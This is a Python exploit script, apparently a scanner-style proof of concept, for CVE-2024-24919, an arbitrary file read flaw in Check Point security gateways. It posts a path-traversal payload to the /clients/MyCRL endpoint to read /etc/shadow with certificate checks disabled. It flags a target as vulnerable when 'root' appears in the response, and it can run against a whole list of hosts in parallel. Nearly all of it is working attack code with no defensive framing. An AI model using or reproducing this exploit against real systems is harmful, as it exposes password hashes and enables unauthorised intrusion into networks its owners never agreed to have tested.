"""
介绍：Check-Point安全网关任意文件读取漏洞(CVE-2024-24919)
指纹：icon_hash="1440532452"
"""
import argparse
import textwrap
from multiprocessing.dummy import Pool

import requests
from urllib3.exceptions import InsecureRequestWarning


def check(target, timeout=5):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/94.0.4606.81 Safari/537.36',
            'Accept': '*/*',
            'Connection': 'close',
        }
        url = target + '/clients/MyCRL'

        data = '''aCSHELL/../../../../../../../etc/shadow'''

        # 抑制 InsecureRequestWarning 警告
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

        response = requests.post(url, headers=headers, verify=False, timeout=timeout, data=data)
        if response.status_code == 200 and 'root' in response.text:
            print('[*]存在漏洞' + url)
        else:
            print('[-]不存在漏洞' + url)
    except TimeoutError:
        print(f"请求超时{target}")
    except Exception as e:
        print(f"连接失败{target}-无法建立连接")




def main():
    banner = """
                ) (`-.            ) (`-.              
         ( OO ).           ( OO ).            
        (_/.  \_)-. ,-.-')(_/.  \_)-. ,-.-')  
         \  `.'  /  |  |OO)\  `.'  /  |  |OO) 
          \     /\  |  |  \ \     /\  |  |  \ 
           \   \ |  |  |(_/  \   \ |  |  |(_/ 
          .'    \_),|  |_.' .'    \_),|  |_.' 
         /  .'.  \(_|  |   /  .'.  \(_|  |    
        '--'   '--' `--'  '--'   '--' `--'    

        """
    print(banner)
    parse = argparse.ArgumentParser(description="Check-Point安全网关任意文件读取漏洞(CVE-2024-24919)", formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog=textwrap.dedent('''example:
    python3 Check-Point_poc.py -u http://xxxx.xxxx.xxxx.xxxx
    python3 Check-Point_poc.py -f x_url.txt '''))
    parse.add_argument('-u', '--url', dest='url', type=str, help='添加url信息')
    parse.add_argument('-f', '--file', dest='file', type=str, help='添加txt文件')

    args = parse.parse_args()
    targets = []
    pool = Pool(30)
    try:
        if args.url:
            check(args.url)
        else:
            f = open(args.file, 'r+')
            for target in f.readlines():
                target = target.strip()
                if 'http' in target:
                    targets.append(target)
                else:
                    url = f"http://{target}"
                    targets.append(url)
            pool.map(check, targets)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()